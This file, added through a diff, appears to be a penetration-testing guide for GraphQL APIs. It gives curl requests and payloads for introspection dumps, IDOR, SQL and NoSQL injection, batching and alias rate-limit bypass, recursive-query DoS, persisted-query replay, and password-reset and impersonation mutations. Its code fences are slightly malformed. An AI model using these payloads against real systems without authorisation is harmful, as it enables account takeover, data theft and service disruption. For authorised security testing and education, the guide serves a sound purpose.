@@ -1,0 +1,70 @@
+# HOW TO TEST GRAPHQL ON A TARGET (2026 expert guide)
+> **Author:** MD MAHABUBUR RAHMAN
+
+## The N ways to test
+1. Discover endpoint: /graphql, /gql, /api/graphql, /v1/graphql + POST vs GET; introspection query.
+2. Introspection abuse: list all types/queries/mutations/fields in one shot.
+3. Introspection off? - field/wildcard fuzzing + QLTD (blind field guessing).
+4. Injection classes INSIDE GraphQL: SQLi, NoSQL, SSTI, XPath through resolver args.
+5. Authorization/IDOR at the resolver level: query user(id:2) that the schema exposes.
+6. Batching for rate-limit bypass (N queries in one body).
+7. Aliases for bypassing query-depth limits (DoS) + cached-query attacks.
+8. Persisted queries (APQ): check application.json allowed IDs - then mutated params.
+9. Indirect attacks: upload/mutations that the server then renders (stored XSS via mutations).
+10. Directives abuse: @skip/@include flipping, deprecated fields fetching unguarded data.
+
+## Step-by-step on target
+1. Find /graphql (fuzz + guess, check JS bundles for /gql path).
+2. Send introspection:
+```
+   {"query":"{__schema{types{name fields{name args{name type{name kind}}}}}}"}
+```
+   -> dump full API in one request. (Introspection enabled = first finding).
+3. If introspection disabled, brute with GraphiQL-style field guesses in a wrapper query.
+4. Run a resolver-level test on every query: swap ids across your accounts; try SQL/noSQL payloads
+   in string args (see SQL folder).
+5. Try mutations for authorization: e.g. createAdmin(token,user) - masses rows.
+6. Test for DoS: deeply nested aliases / recursive fragments; deep query; batching with 100 aliases.
+7. Replay persisted query IDs you find with modified parameters (APQ).
+
+## Bypass ladder
+- Rate limits: batching, fragments, alias consent.
+- Authz at resolver: often they check only "isAuthenticated" not "owns object" -> IDOR via GraphQL.
+- Query depth limits: flatten one huge query into aliSession to defeat per-query count.
+
+## False positives
+- Introspection ON is generally intended in dev; assess if it EXPOSES sensitive mutations to
+  authenticated only. Bug bounty: sensitive resolver without ownership = real.
+- Batching returning 200 where each of 100 queries failed = no DoS, just noisy.
+
+## Tools
+- GraphQL introspection JS, clairvoyance (field fuzzer), gqlmap, inql, graphql-cop; Burp BApp.
+
+## WORKED EXAMPLES (concrete)
+A. Introspection dump (one request, full schema):
+```
+curl -i -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{
+  "query":"{__schema{queryType{name} mutationType{name} types{name fields{name args{name type{name kind}}}}}}"
+```
+}'
+B. Bare query after endpoint guess:
+```
+curl -i -X POST "https://target.com/api/graphql" -H "Content-Type: application/json" -d '{"query":"{ me { id email } }"}'
+C. IDOR at resolver level:
+query { user(id: 102) { email } }        # logged as user 101
+mutation { updateUser(id:102, email:"pwn@a.com") }   # no ownership check
+D. SQLi / NoSQLi through a string arg:
+{"query":"{ search(q: \"1' OR '1'='1\") { id } }"}
+{"query":"{ lookup(name: \"{x:\\\"$gt\\\":\\\"\\\"}\") }"}   # for mongo backends
+E. Deep-query DoS (depth limit bypass):
+fragment A on User { friends { ...A } }   -> recursive; use aliases to multiply
+{"query":"{ alias1: user(id:1){id} alias2: user(id:1){id} }"}   # batching/alias rate bypass
+F. Persisted query replay:
+APQ cache: {"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"},"variables":{...}}}
+-> then mutate the id variable even if query param fixed.
+G. Non-introspection field guessing (clairvoyance); wildcard:
+{"query":"query{__typename}"}                 # first signal the stack is GraphQL
+H. Mutation abuse chain:
+{"query":"mutation{ resetUserPassword(id:102) { token } }"}
+{"query":"mutation{ impersonate(userId:102) { session } }"}
+```
